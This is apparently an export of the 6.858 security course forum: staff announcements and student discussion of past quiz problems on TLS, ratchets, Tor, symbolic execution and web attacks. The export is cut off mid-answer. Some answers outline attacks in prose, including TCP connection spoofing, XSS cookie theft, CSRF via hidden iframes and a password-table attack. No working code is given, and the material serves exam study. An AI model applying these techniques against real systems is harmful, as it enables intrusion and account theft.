<h1>Lab 5 Checkoff / Final Project Presentation Signups</h1>
<h3>2018-05-11T01:58:38Z</h3>
<div><p><a href="https://docs.google.com/spreadsheets/d/1N9fwgdPZMW-dBpaZBmqQwMdPSNhyQ1M7E560XbrqUFc/edit?usp=sharing" target="_blank">Sign up</a> for lab 5 checkoffs / Final Project Presentations by Sunday midnight (11:59PM)! Please fill in your team member&#39;s Kerberoses concatenated by dashes. If you did a final project, put your kerberoses in one of the fields under Final Project Presentations slots.</p>
<p></p>
<p>For this check-off we will ask you to:</p>
<p></p>
<p>- Demo your SecFS implementation. E.g. run ./test.sh. start a server and do some rudimentary operations.</p>
<p>- Briefly explain how your overall design works</p>
<p>- Answer a couple questions the TA asks you about your implementations</p>
<p>- What suggested improvement to SecFS you made and how you approached it</p>
<p></p>
<p>Make sure to have all team members come to the meeting as well as a laptop with your SecFS implementation.</p>
<p></p>
<p>Best,</p>
<p>6.858 Staff</p>
<p></p>
<p>#pin</p></div><hr><h1>6.858 evaluation</h1>
<h3>2018-05-09T17:26:07Z</h3>
<div><p>You can provide feedback on this spring&#39;s edition of 6.868 at: <a href="http://web.mit.edu/subjectevaluation">http://web.mit.edu/subjectevaluation</a>.   We love to have feedback so that we can improve  6.858 for future students, so if you have few spare minutes, please fill out the evaluation.</p></div><hr><h1>Merging in lab skeleton changes &#43; handout changes</h1>
<h3>2018-04-27T19:49:43Z</h3>
<div><p>Since the lab was released, there have been some minor edits and changes. If you haven&#39;t cloned the final lab repository, there is nothing that you need to do. If you have already cloned it, you can merge it by doing the following:</p>
<p></p>
<pre>git fetch upstream<br />git merge upstream/master</pre>
<p></p>
<p>We do not anticipate that there should be any merge conflicts, but if you do get them, you should do <tt>git status</tt> to see which files have conflicts, and then merge them. You can either use git mergetool or open the conflicted file in your editor and look for sections with <tt>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</tt> in them. When you have resolve the conflicts, <tt>git add</tt> the resolved files, and then run <tt>git commit</tt>.</p>
<p></p>
<p>The lab handout is updated with a note about signing and verifying if you are using a Python dictionary as your data structure under Exercise 1: <br /><br /></p>
<pre>When you implement cryptographic signing and verification, if you have to sign a Python dictionary, remember to find a way to deterministically serialize your dictionary before signing or verifying. Python dictionaries do not guarantee order and can result in different signatures on the same dictionary.</pre>
<p></p>
<p>All the best for the final project!</p>
<p></p>
<p>#pin</p>
<p></p></div><hr><h1>Lecture Live QA</h1>
<h3>2018-02-26T08:06:19Z</h3>
<div><p>Since we&#39;ve been getting quite a lot of questions during lecture on the Anonymous Question submission system, a lot of which are questions that we can respond to directly, we&#39;re trying out a new QA system where you can see other students&#39; submissions as well as staff responses to them...</p>
<p></p>
<p>this also means that it can very easily become flooded by unrelated threads. Please be mindful when posting questions/responses so that they stay relevant to the lecture material. If this format proves to be disruptive to class, we&#39;ll likely revert to the old AnonQA site.</p>
<p></p>
<p>Here&#39;s the link to the new site: <a href="https://mit6858qa.herokuapp.com/">https://mit6858qa.herokuapp.com/</a><a href="https://mit6858qa.herokuapp.com/" target="_blank"></a></p>
<p></p>
<p>#pin</p>
<p></p></div><hr><h1>Search for Teammates!</h1>
<h3>2017-12-07T02:07:08Z</h3>
<div><script type="text/javascript">PA.load("/dashboard/project_partners", null, function(data){ $('#' + 'questionText').html(data);});</script> #pin</div><hr><h1>KDF Ratchet</h1>
<h3>2018-05-21T00:56:14Z</h3>
<div><p>Can somebody explain why KDF ratchets provide better forward secrecy than DH ratchets?</p>
<p></p>
<p>Suppose Alice and Bob are communicating with each other using a KDF ratchet. Suppose Alice sends several messages (with different message keys) but Bob doesn&#39;t acknowledge them. Wouldn&#39;t Alice have to store all of these message keys until she receives acknowledgements from Bob? Isn&#39;t this the same forward secrecy problem we had with DH ratchets?</p>
<p></p>
<p>Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>I believe the forward secrecy problem for DH ratchet stems from the fact that the same key is used when multiple messages are sent in the same direction. From the <a href="https://css.csail.mit.edu/6.858/2018/lec/l22-messaging.txt" target="_blank">notes</a>:</p>
<p></p>
<p><strong>DH Ratchet (Same key used for repeated direction)</strong></p>
<p></p>
<pre>A --&gt; B: NEW(g^a3), Seal(g^a2b2, &#34;...&#34;)  # MAC(g^a3, g^a2b2) 
A --&gt; B: NEW(g^a3), Seal(g^a2b2, &#34;...&#34;)  # MAC(g^a3, g^a2b2) 
A --&gt; B: NEW(g^a3), Seal(g^a2b2, &#34;...&#34;)  # MAC(g^a3, g^a2b2) </pre>
<p></p>
<p><strong>KDF Ratchet (New key even for repeat direction):</strong></p>
<pre>A &lt;-- B: 1, Seal(k1, &#34;hey alice&#34;)   (c1, k1 = KDF(c0))
A &lt;-- B: 2, Seal(k2, &#34;...&#34;)         (c2, k2 = KDF(c1))</pre>
<p></p>
<p>Imagine Alice sends Bob 100 ciphertexts in a row (all recorded by Eve), and then Eve manages to access Alice&#39;s memory.</p>
<p></p>
<p>In DH Ratchet, Eve immediately recovers g^a2b2 and can decrypt all 100 past messages.</p>
<p>In KDF Ratchet, Eve immediately recovers k100, which can only decrypt the <em>next</em> message that Alice or Bob send.</p></div><hr><h1>2011 q2 #14</h1>
<h3>2018-05-20T21:59:03Z</h3>
<div><p>I don&#39;t understand the solution. How is the cookie (or the URL provided in the solutions) then emailed to the adversary (without using query strings)?</p></div><hr><h1>2013 q2 #1</h1>
<h3>2018-05-20T21:36:07Z</h3>
<div><p>How does the adversary &#34;Save the victim’s cookie into the victim’s zoobar profile&#34;?</p></div><hr><h1>Why do we use DH Key Exchange for secure message?</h1>
<h3>2018-05-20T20:43:21Z</h3>
<div><p>Rather than Alice simply using Bob&#39;s public key to encrypt a symmetric key of her choosing and sending it to Bob, in the original version without any forward/backward secrecy guarantee. </p></div><hr><h1>2014 q2 #6 - Marking Taint</h1>
<h3>2018-05-20T20:27:11Z</h3>
<div><p>In this problem, the answers say that at the end of execution, z will have no taint labels. However, the value of IMEI determines control flow (which side of the branch is taken) which determines the value of z. Why is z not given the IMEI taint flag then seeing as the value of input IMEI determines the value of z?</p></div><hr><h1>2015 q2 #1</h1>
<h3>2018-05-20T20:01:45Z</h3>
<div><p>Could someone explain this attack more in depth? How would the attacker replace the message, and what exactly is the message (isn&#39;t the snippet just part of Ben&#39;s HTML)? Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>The first snippet loads in a JS script from <a href="http://adsadsads.com/ads.js?customer=bensblog">http://adsadsads.com/ads.js?customer=bensblog</a> so that some content from adsadsads.com can be displayed in Ben&#39;s website. Without https, this script will be loaded insecurely (without TLS), which means it will not be encrypted.  If a man in the middle intercepts the message, they can edit or replace the script with some malicious JS code and send it along without Ben realizing.  With https, this would not be possible since the message would be encrypted and the man in the middle would not have Ben&#39;s private key. </p></div><hr><h1>2017 q2 #17</h1>
<h3>2018-05-20T19:50:31Z</h3>
<div><p>The solution says:</p>
<p></p>
<p><tt>Previously, an adversary could trick the user into visiting http://www.google.com (without HTTPS) and injecting the adversary’s own Google account cookie. This would save the victim’s Google searches into the adversary’s account.</tt></p>
<p></p>
<p>This seems like a pretty different attack from reading the victim&#39;s cookie sent in plaintext over the wire.</p>
<p></p>
<p>My understanding of the encrypted cookie is that the adversary can&#39;t set their own cookie anymore because they don&#39;t have Google&#39;s private key to properly encrypt their cookie when setting it. Or is it also not as simple to set the cookie value anymore?</p>
<p></p>
<p>If the cookie value is set in the same way but just encrypted now, why can&#39;t the adversary observe how Google normally encrypts their own cookie, and then use that value?</p></div><hr><h1>2017 q2 #13</h1>
<h3>2018-05-20T19:38:27Z</h3>
<div><p>How would the adversary load the URL&#39;s necessary? Would it be just automatic submission of forms (upon victim visiting adversary&#39;s site) that send those requests? Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>I think you could do something similar to Lab4, where you have hidden iframe(s) on the attacker website that automatically submits the necessary forms.</p></div><hr><h1>2013 q1 #13</h1>
<h3>2018-05-20T19:29:50Z</h3>
<div><p>The answer specifies &#34;First, it allows an adversary with access to the network of a visitor to Ben’s web site to inject arbitrary Javascript code into Ben’s HTTPS page, bypassing any cryptographic protection Ben might have wanted. Second, it allows an adversary that compromises code.jquery.com to serve arbitrary Javascript code to run in browsers that visit Ben’s page, even if that adversary doesn’t control the visitor’s network.&#34; </p>
<p></p>
<p>The second makes sense to me. Re: the first, what is its connection to this particular script tag? Isn&#39;t that always the case if you have access to the network of a visitor?</p></div>
<h2>Followup</h2>
<div><p>What are the reasons behind both of these vulnerabilities? Is it because no use of HTTPS and no use of iframe? In other words, what are the preventions? Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>The first is just because of HTTP in general - With HTTPS, you can verify that you&#39;re talking to the right jquery server (e.g., using certificates), but with HTTP, it&#39;s possible for an adversary to execute a man-in-the-middle attack.  Since the example given is with an http prefix, that&#39;s an issue.</p></div><hr><h1>2009 q1 #6</h1>
<h3>2018-05-20T15:31:57Z</h3>
<div><p>&#34;The paper argues that the child policy (where a frame can navigate its immediate children) is unnecessarily strict, and that the descendant policy (where a frame can navigate the children of its children’s frames, and so on) is just as good. Give an example of how the descendant policy can lead to security problems that the child policy avoids.</p>
<p></p>
<p>Answer: Consider a web site that contains a login frame, where users are expected to input passwords. Under the descedant policy, an attacker can put the web site in a frame, and navigate the login frame (a grandchild) to http://attacker.com, which looks similar to the original one, to steal passwords.&#34;</p>
<p></p>
<p>I don&#39;t think I follow how these frames are structured and what their relationships are. I assume trust is transitive and if one frame trusts its child, it should trust the child of child too and so I&#39;m confused how the answer comes out without the involvement/collusion with a child frame.</p>
<p></p>
<p></p></div><hr><h1>2012 q1 #6</h1>
<h3>2018-05-20T03:32:09Z</h3>
<div><p>I&#39;m confused by this part of the solutions: &#34;With SSL, yes: the server can impersonate the server to another client, but no clients will connect to the adversary’s fake server.&#34; Firstly, shouldn&#39;t it be &#34;the adversary can impersonate the server&#34;? Secondly, is the reason no clients will connect because the adversary won&#39;t have the power to route them to itself? I don&#39;t get how it can impersonate it but not get connections, nor how gaining control of network routers (in #7) helps.</p>
<p></p>
<p>Thanks!</p></div><hr><h1>Purpose of Firewalls (2013 q2 #5)</h1>
<h3>2018-05-20T03:26:59Z</h3>
<div><p>Are they ever to prevent DoS attacks (e.g. something like a SYN flood)? 2013 q2 #5 makes it seem like firewalls may actually worsen a DDoS attack?</p></div><hr><h1>2013 q1 #6</h1>
<h3>2018-05-20T03:22:33Z</h3>
<div><p>Why would the ISN_s be hash(s), where s = previous ISN_s?</p></div><hr><h1>2014 q2 #2</h1>
<h3>2018-05-20T03:20:31Z</h3>
<div><p>Could someone explain the solution a bit more? How would the returned bytes give you the password? And why does it matter that several servers use this protocol (it seems like the attack is just using one)? Thanks! :)</p></div>
<h2>Student Answer</h2>
<div><p>The attacker has a list of common passwords. The attacker can make a bunch of fake accounts that use these common passwords. Now the attacker can log into these accounts, <strong>using a particular &#34;random number&#34; </strong>(say 0). Since the attacker has an account on the server, the server will respond with rng(password &#43; &#34;random number&#34;). The response of the server depends only on the password and the random number, both of which are known to the attacker; therefore the attacker can figure out how the server will respond for each of the common passwords. So now the attacker has a table mapping from passwords to the server&#39;s response using that &#34;random number&#34;.  </p>
<p></p>
<p>Now, the server tries to login to a victim account with a popular username. The server sends over the username and &#34;random number&#34; to the server, and gets a number back. The attacker sees if this number shows up in the table that they made; if it does, the attacker knows the victim&#39;s password. </p>
<p></p>
<p>I think this would still work if only one server used this protocol, although perhaps in this case it would be easier for the server to identify the attacker&#39;s suspicious behavior of generating a bunch of dummy accounts with common passwords. </p></div><hr><h1>2017 q2 #10</h1>
<h3>2018-05-20T03:08:43Z</h3>
<div><p>How does IS&amp;T define &#34;on-campus&#34; users? Thanks!</p></div><hr><h1>2015 q2 #12</h1>
<h3>2018-05-20T02:50:32Z</h3>
<div><p>Why is F True? I thought that DH does not provide forward secrecy. From lecture notes, it seems that DH provides future secrecy and KDF provides forward secrecy:</p>
<p></p>
<pre>Third attempt: double ratchet
-----------------------------

DH ratchet: bad forward secrecy, good future secrecy
KDF ratchet: good forward secrecy, bad future secrecy

Idea: combine them: update the KDF ratchet occasionally with the DH ratchet.</pre>
<p></p>
<p>In addition, are the three challenges associated with secure channels (authenticating servers, authenticating messages, and having forward secrecy) all covered by TLS/SSL? In other words, does the base implementation provide authentication of servers (via certificates / TOFU), authentication of messages (via MAC, and also prevention of replay b/c of SNs or session IDs), and forward secrecy (via continuously updating keys)? In that case I can see why F would be true since we are saying TLS does provide forward secrecy. But then I&#39;m confused as to why we talked about DH not providing it...</p>
<p></p>
<p>Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>This question is not asking about DH key exchange in the context of establishing a TLS connection, not about the DH ratchet. DH key exchange is different from the DH ratchet. The TLS protocol provides forward secrecy as discussed in the Secure Channel notes using session keys. </p>
<p></p>
<p>The DH ratchet is a protocol for rotating keys in order to provide good future secrecy, as discussed in the secure messaging lecture. </p>
<p></p>
<p></p>
<p></p></div><hr><h1>DH Ratchet</h1>
<h3>2018-05-19T23:05:45Z</h3>
<div><p>The lectures notes have the following:</p>
<p></p>
<pre>First attempt: DH ratchet (used in OTR)
---------------------------------------

Setup: same as before; shared key = g^a0b0

A --&gt; B: NEW(g^a1), Seal(g^a0b0, &#34;hello bob&#34;)  # MAC(g^a1, g^a0b0)
A &lt;-- B: NEW(g^b1), Seal(g^a1b0, &#34;hey alice&#34;)  # MAC(g^b1, g^a1b0)  ...Alice deletes a0

A --&gt; B: NEW(g^a2), Seal(g^a1b1, &#34;...&#34;)  # MAC(g^a2, g^a1b1)        ...Bob deletes a0
A &lt;-- B: NEW(g^b2), Seal(g^a2b1, &#34;...&#34;)  # MAC(g^b2, g^a2b1)        ...Alice deletes b1
A --&gt; B: NEW(g^a3), Seal(g^a2b2, &#34;...&#34;)  # MAC(g^a3, g^a2b2) 
A --&gt; B: NEW(g^a3), Seal(g^a2b2, &#34;...&#34;)  # MAC(g^a3, g^a2b2) 
A --&gt; B: NEW(g^a3), Seal(g^a2b2, &#34;...&#34;)  # MAC(g^a3, g^a2b2) </pre>
<p></p>
<p>I&#39;m a bit confused on when we delete the keys. Assuming we delete our key once we get acknowledgement that the other person is using the updated key (as in the first case that says &#34;Alice deletes a0&#34;), then shouldn&#39;t the next two be &#34;Bob deletes b0&#34; and &#34;Alice deletes a1&#34;?</p>
<p></p>
<p>Thanks!</p></div>
<h2>Staff Answer</h2>
<div><p>That was a typo! Fixed; thanks.</p></div><hr><h1>any chance we can get notes or slides for lectures 19 and 20?</h1>
<h3>2018-05-19T23:05:06Z</h3>
<div><p>they&#39;re guest lectures, no slides are linked on the 6.858 schedule</p></div>
<h2>Student Answer</h2>
<div><p>http://css.csail.mit.edu/6.858/2012/lec/l16-tor.txt</p></div><hr><h1>SSL Handshake</h1>
<h3>2018-05-19T22:06:28Z</h3>
<div><p>This is the SSL Handshake: </p>
<pre>SSL 3.0 handshake
  1. C -&gt; S: Hello: client version, randomC, session_id, ciphers
  2. S -&gt; C: Hello: server version, RandomS, session_id, ciphers
  3. S -&gt; C: ServerCertificate: cert list
  4. S -&gt; C: HelloDone
  5. C -&gt; S: ClientKeyExchange: encrypt (pre_master_secret, PK_S)
  6. C -&gt; S: ChangeCipherSpec
  7. C -&gt; S: finished, MAC({master_secret &#43;&#43; msg 1,2,3,4,5}, C_key) (and encrypted)
  8. S -&gt; C: change cipher spec
  9. S -&gt; C: finished MAC({master_secret &#43;&#43; msg 1,2,3,4,5,7}, S_Key)  (and encrypted)
  10. C -&gt; S: encrypt(sign(data, MAC_secret), C_key)
</pre>
<p>My questions are</p>
<p>1) what is the point of the pre-master secret? </p>
<p>2) in the above steps, what is S_key vs C_key? </p></div>
<h2>Student Answer</h2>
<div><p>You can find a detailed explanation of the TLS protocol in the textbook linked here #775. </p>
<p>https://ocw.mit.edu/resources/res-6-004-principles-of-computer-system-design-an-introduction-spring-2009/online-textbook/protection_open_5_0.pdf<br /><br />1. My understanding is that the pre_master_secret allows the client and the server to compute a master_secret, which is used to generate all other keys used for encryption/MACs. master_secret is computed using PRF(pre_master_secret, &#34;master secret&#34;, RandomC &#43; Random S).</p>
<p>2. S_key and C_key are server_write_key and client_write_key respectively, which are two of the keys generated from the master_secret. </p></div><hr><h1>TCP Handshake</h1>
<h3>2018-05-19T19:58:08Z</h3>
<div><p>The lecture notes have the following:</p>
<p></p>
<pre>Standard handshake (figure on the right side of page 2):
    C: SRC=C, DST=S, SYN(SNc)
    S: SRC=S, DST=C, SYN(SNs), ACK(SNc)
    C: SRC=C, DST=S, ACK(SNs)
    C: SRC=C, DST=S, data(SNc), ACK(SNs)</pre>
<p></p>
<p>Why is the ACK(SNs) required while sending data (in the last step)? Is it so that the server continues to trust that it is receiving messages from C (since C is the only one that should know SNs)? And does this first message from C have to be SNc, or was that just an example?</p>
<p></p>
<p>Similarly, after the handshake is complete, if the server sends data to the client, does the server have to ACK SNc every time?</p>
<p></p>
<p>Thanks!</p></div><hr><h1>First year for these?</h1>
<h3>2018-05-19T19:22:21Z</h3>
<div><p>I just wanted to confirm that the following were introduced into the curriculum this year (just want to make sure I&#39;m not missing any previous exam questions on these):</p>
<p>- Spectre</p>
<p>- LAVA</p>
<p>- Bitcoin</p>
<p></p>
<p>Thanks!</p></div>
<h2>Student Answer</h2>
<div><p>I believe so. All three topics didn&#39;t appear in past years&#39; course schedule either. </p></div><hr><h1>2014 q1 #9</h1>
<h3>2018-05-19T19:00:44Z</h3>
<div><p>I want to make sure I have the correct logic for this problem. Given that x = 0 initially, the concolic execution system first sends the constraint (x &#43; 7) &gt; 10 to Z3, right? And then, since x = 0, we know that that constraint is unsatisfied with this concrete value, so we move on to the second if statement, and the system then sends the constraint NOT ( (x &#43; 7) &gt; 10) AND ( (x &#43; 7) * (x &#43; 7) = 256 ). Is that correct?</p>
<p></p>
<p>In addition, if the initial value was x = 4, would we just terminate and not send anything to Z3 for the second if statement?</p>
<p></p>
<p>Finally, if we were just dealing with symbolic execution (vs. concolic), would the process be to create all the constraints and invoke Z3 at each constraint to see if it is satisfiable. If satisfiable, we continue until we reach a return / bug and then come up with a model that fits the entire path constraint? If not, we remove that path&#39;s constraints (/stop executing that path)?</p>
<p></p>
<p>Thanks!</p></div><hr><h1>Diagram of TLS handshake</h1>
<h3>2018-05-19T15:51:02Z</h3>
<div><p>During lecture, Prof Kaashoek put up a diagram on the board describing the full TLS handshake. I have not been able to find as good of a diagram online, and I was wondering if it was possible to get a copy of it.</p></div>
<h2>Staff Answer</h2>
<div><p>See, <a href="https://ocw.mit.edu/resources/res-6-004-principles-of-computer-system-design-an-introduction-spring-2009/online-textbook/protection_open_5_0.pdf,">https://ocw.mit.edu/resources/res-6-004-principles-of-computer-system-design-an-introduction-spring-2009/online-textbook/protection_open_5_0.pdf,</a> page 120 in the PDF (11-118).  </p></div>
<h2>Followup</h2>
<div><p>How does this protocol ensure forward secrecy?</p>
<p></p>
<p>The random_client, random_server are sent unencrypted, and the pre_master_secret is encrypted using the servers public key. If an adversary compromises the server&#39;s secret key and was storing all the messages, it would be able to recover pre_master_secret, random_client, random_server, which are sufficient to recover the master_secret and all other keys used for encryption/MACs. Therefore, the adversary would be able to read all the past messages. </p>
<p></p>
<p>Am I missing something, or does TLS not provide future secrecy? </p>
<p></p>
<p></p>
<p></p>
<p></p>
<p></p></div>
<h3>Followup Response</h3>
<div><p>Are some of the details missing, and the pre_master_secret gets signed by a session key, which is sent over and signed with the server&#39;s private key? </p></div>
<h2>Followup</h2>
<div><p>The version in the paper and the diagram does not provide forward secrecy.   Modern versions can be configured to support forward secrecy by using the Elliptic Curve Diffie-Hellman (ECDHE) key exchange instead of RSA.</p></div>
<h3>Followup Response</h3>
<div><p>Thanks, that makes sense! </p></div>
<h3>Followup Response</h3>
<div><p>The example in the review session used an extra PK_tmp public key to ensure forward secrecy for the session.</p></div><hr><h1>Clarification on nonce reuse</h1>
<h3>2018-05-19T02:57:42Z</h3>
<div><p>My explanation during the review session of why Encrypt needs a new nonce (or sequence number) for each message was not very crisp.</p>
<p></p>
<p>Here is a small example in Go showing what happens when you reuse a nonce:</p>
<p></p>
<p><a href="https://play.golang.org/p/drAg6pmq9ky">https://play.golang.org/p/drAg6pmq9ky</a></p>
<p></p>
<p>You can think of the symmetric <tt>Encrypt</tt> function from the review session as<tt></tt> a deterministic function that creates a one-time pad from the key and nonce and xors the pad with the message. Since the function is deterministic, it will produce the same one-time pad for the same key and nonce values, which leads to the behavior you see in the Go code.</p>
<p></p>
<p>The <tt>Seal</tt> function in the Go code is like Encrypt, but also appends the MAC to the end of the ciphertext.</p></div><hr><h1>2017 Quiz Problem 16 - TLS</h1>
<h3>2018-05-19T01:14:52Z</h3>
<div><p>Part of the solution states that &#34;Note that they [the attacker] can not decrypt observed traffic.&#34; To make sure I understand - if the attacker does a MitM attack, they can pose as Google and read all traffic back and forth between the user and Google, correct? The attacker is just unable to decrypt traffic they observe from other users who they aren&#39;t MitM-ing (because those messages aren&#39;t encrypted with Google&#39;s private key)?</p></div>
<h2>Student Answer</h2>
<div><p>I think by &#34;observed traffic&#34; they mean <em>previously</em> sent messages.  Because Google has implemented forward secrecy (i.e. via short-lived keys that are not its actual private key) the attacker wouldn&#39;t be able to decrypt those messages. </p>
<p></p>
<p>My assumption then is that for <em>future</em> traffic, the attacker themselves could pick the short-lived keys, and then by able to decrypt.  (Maybe someone could confirm?) </p></div><hr><h1>Quiz 2 EXE question</h1>
<h3>2018-05-19T00:06:23Z</h3>
<div><p>Hey everyone,</p>
<p></p>
<p>I have a correction on the EXE review session. Like I said, evaluation of the cumulative expression for possible concrete values happens at the leaves of the tree. <strong>BUT</strong>; Pruning does indeed happen as an optimization on branch, so Q2-2017 was right.</p>
<p></p>
<p>So there&#39;s two stages when STP is called:</p>
<p>1. On branch, to figure out if the expression is SAT, if not prune it.</p>
<p>2. On leaf, to construct the set of values of the symbolic vars. Then run concrete!</p>
<p></p>
<p>Sorry for the mixup, good luck on the final!</p>
<p></p>
<p></p></div>
<h2>Followup</h2>
<div><p>So, when they say &#39;STP solver,&#39; do they really mean &#39;STP decider&#39;? For a question like Q2-2017, how can we determine which case they&#39;re asking for (a solver for the decision problem vs. a solver for the search problem)?</p></div>
<h3>Followup Response</h3>
<div>There is no STP decider, they are both the STP solver. In one case it returns SAT, and that’s the end of that path; in the other case, if it’s a leaf and it’s unsat, we concretely iterate through all the values in the model generated.<p></p></div><hr><h1>Onion Key</h1>
<h3>2018-05-18T22:25:15Z</h3>
<div><p>Is the onion key in Tor a public key? The paper mentions that the OP connects to an OR and sends the initial create request encrypted with the onion key. So are onion keys publicly broadcasted?</p></div><hr><h1>Quiz 2 review questions</h1>
<h3>2018-05-18T21:28:03Z</h3>
<div><p>I&#39;ve posted the questions I&#39;ll be going over in tonight&#39;s review session:</p>
<p></p>
<p><a href="https://css.csail.mit.edu/6.858/2018/reviews/r18-2.pdf">https://css.csail.mit.edu/6.858/2018/reviews/r18-2.pdf</a></p>
<p></p>
<p>Some of the questions are from past quizzes, others I made up for the review session.</p></div>
<h2>Followup</h2>
<div><p>For III. Secure Channels, is #9 using a KDF ratchet? My understanding is that KDF ratchet supplies forward secrecy, while DH ratchet does not (it actually prevides future secrecy). Thanks!</p></div>
<h3>Followup Response</h3>
<div><p>Yes, that&#39;s the idea for Question 9. Roll the key K forward using a KDF.</p>
<p></p>
<p>Note that <strong>DH Ratchet</strong> is different from DH key exchange.</p></div>
<h2>Followup</h2>
<div><p>Are solutions to the new questions made for the review session available anywhere? I was unable to attend.</p></div>
<h3>Followup Response</h3>
<div><p>There are no solutions available. Feel free to try the problems and ask questions!</p></div><hr><h1>2017 quiz2 #14 (steal cookie)</h1>
<h3>2018-05-18T17:49:29Z</h3>
<div>Describe how an adversary can obtain the user ID of a victim user, and explain what an adversary can do given that user ID. Again, assume that the victim will visit a web page of the adversary’s choosing.

Does this assume no SOP? With SOP, would the attacker be able to read the address returned in /address?</div>
<h2>Student Answer</h2>
<div>Figured it out. I thought show_address() just returned data, but it actually renders an HTML page. The page will inject the script that sends data to attacker.com when the user visits it.</div><hr><h1>2015 Quiz2 Q5.C (TLS)</h1>
<h3>2018-05-18T17:33:33Z</h3>
<div><p>I think I&#39;m missing something re: TLS - What part of the TLS protocol prevents the replay of bytes that a client sent earlier?  Obviously between sessions the DH-negotiated keys would change, but why would replay be prevented within a single session?</p></div>
<h2>Followup</h2>
<div><p>Is this because of the session_id that is passed during the first step of the handshake?  Looking back in my notes, I see that we discussed using session_ids and tracking all past messages within a session as a way to prevent replay attacks - Is this what happens in TLS?</p></div>
<h2>Staff Answer</h2>
<div><p>Sequence numbers would be used to prevent replay attacks.</p></div><hr><h1>2017 quiz2 #3 (IP spoofing)</h1>
<h3>2018-05-18T17:24:35Z</h3>
<div>Which of the following scenarios would allow an adversary to spoof a TCP connection from the IP address of Ben Bitdiddle’s machine on MIT’s campus to Gmail’s SMTP server? Assume the adversary can send arbitrary packets from his own network connection. All scenarios are independent of one another.

Why is &#34;C. The adversary can passively monitor traffic on Ben Bitdiddle’s subnet.&#34; one of the answers? Seems like passive monitoring will allow you to guess sequence numbers more easily, but it also doesn&#39;t seem absolutely necessary. Also, isn&#39;t active monitoring necessary in order to inject packets?</div>
<h2>Student Answer</h2>
<div><p>I assume that this means you could see the SN that the server has picked, en route to Ben.  So the attack would be:</p>
<p>1) Send a TCP packet claiming to be from Bob</p>
<p>2) Monitor Bobs network for the the response of the server, and steal the SN for the server</p>
<p>3) Send your own ACK to the server with the correct server SN</p></div><hr><h1>2015 quiz2 #7</h1>
<h3>2018-05-18T16:00:12Z</h3>
<div><p>Couldn&#39;t Bob assign multiple IP addresses to his computer and establish a new connection with the server with each IP address?</p>
<p></p>
<p>It seems like assigning multiple IP addresses to a computer is possible. Source: http://www.tomshardware.com/faq/id-1925787/computer-address.html</p></div>
<h2>Student Answer</h2>
<div>I don&#39;t think SYN cookies protect against botnets or DDOS attacks. Assigning multiple IP addresses to a single NIC is like owning a botnet, but less scalable/practical. Consider that TCP without SYN cookies can tolerate 50 half-open connections, but the tutorial you linked to seems cumbersome to set up even 2.</div><hr><h1>Length of Final Exam</h1>
<h3>2018-05-17T16:38:38Z</h3>
<div><p>Should we expect that Quiz 2 (the final exam) will be twice as long (in terms of material) as Quiz 1, because it has twice the allocated time (3hrs versus 1.5hrs)?</p></div>
<h2>Student Answer</h2>
<div>Last year’s quiz 2 was 120min</div>
<h2>Staff Answer</h2>
<div><p>This year&#39;s final quiz will also be 120 minutes.</p></div>
<h2>Followup</h2>
<div><p>Just to confirm, this means it&#39;s 9am-11am, right?</p></div>
<h3>Followup Response</h3>
<div><p>Fair question. :-)</p>
<p></p>
<p>Yes, 9am-11am.  I&#39;ve updated the web site to match.</p>
<p></p>
<p>Thanks!</p></div><hr><h1>2017 quiz2 #16</h1>
<h3>2018-05-17T06:14:32Z</h3>
<div><p>The question says: &#34;Suppose that Google discovers that an adversary has stolen the TLS certificate for https://www.google.com, along with the corresponding <strong>private key</strong>.&#34; What private key is the question referring to? The private key that the CA uses to sign {server, PK_S} pairs, or the private key of Google (SK_S)?</p>
<p></p>
<p>Also, why can&#39;t the attacker decrypt the observed traffic? When a client wants to connect to a server, it executes the following handshake:</p>
<p>(1) C --&gt; S: connect<br />(2) C &lt;-- S: PK_S, Sign(SK_CA, {server: PK_S})<br />(3) C --&gt; S: Encrypt(PK_S, freshKey)<br />(4) C &lt;-&gt; S: Encrypt(freshKey, m...)</p>
<p></p>
<p>If an attacker knows the private key of the CA (SK_CA), wouldn&#39;t the attacker be able to send his own certificate in (2) Sign(SK_CA, {attacker: PK_A}) to impersonate the server and decrypt all messages sent by the client?</p></div>
<h2>Staff Answer</h2>
<div><p>The question asks: what can the attacker do if it steals SK_S?</p>
<p></p>
<p>What does the attacker need to do in order to decrypt messages from the client, in addition to stealing SK_S (or SK_CA)?</p></div>
<h2>Followup</h2>
<div><p>Thanks. I just went over the notes from lecture 15. It seems like the attacker would need to know the short-lived keys used for encryption in order to decrypt observed traffic.</p></div><hr><h1>2017 quiz2 #15 (web security)</h1>
<h3>2018-05-17T05:36:21Z</h3>
<div><p>The answer says: &#34;Either of the two above attacks should now be impossible, since the victim’s browser will not include the victim’s cookie with the requests.&#34;</p>
<p></p>
<p>Wouldn&#39;t it be possible to execute the attach from #13 by loading the URLs in hidden iframes?</p></div>
<h2>Followup</h2>
<div><p>Followup on this -- same site cookies would only protect against CSRF attack? If the adversary had the victim directly load those URLs (in the solutions) via XSS attack (click on link like in lab 4), would it still work?</p></div>
<h3>Followup Response</h3>
<div><p>I think the problem with having the user load the URLs directly is  that the attacker would need to get the user to load the 3 urls in order, which seems really hard. </p>
<p></p>
<p>I am not sure what you mean by &#34;directly load those URLS&#34; via XSS attack. </p>
<p></p>
<p></p></div>
<h3>Followup Response</h3>
<div><p>Oh I just meant exactly that — clicking three links. Not practical. XSS is the name for that I believe? (From lab 4)</p></div>
<h2>Student Answer</h2>
<div><p>Using hidden iframes would not work, because the requests would be coming from the attacker&#39;s origin and not banjos.com&#39;s origin. </p></div><hr><h1>2017 quiz2 12 (symbolic/concolic execution)</h1>
<h3>2018-05-17T04:30:10Z</h3>
<div>What are the implications of concolic_int not implementing __mod__? Does this mean it can’t pass the constraint to Z3 to solve? If so, why is B. 3, 0, 1 a correct answer?<div><br /></div><div>More broadly, can you explain why each of the multiple choice options is/isn’t correct? I don’t understand the order of the return values.</div></div>
<h2>Student Answer</h2>
<div>Because concolic_int does not provide __mod__, the concolic executor won&#39;t branch at &#34;if x%2==1&#34;. The tree of execution has three leaves:
1) x &gt; 30 VALID
2) x &gt; 30 INVALID x &gt; 10 VALID
3) x &gt; 30 INVALID x &gt; 10 INVALID

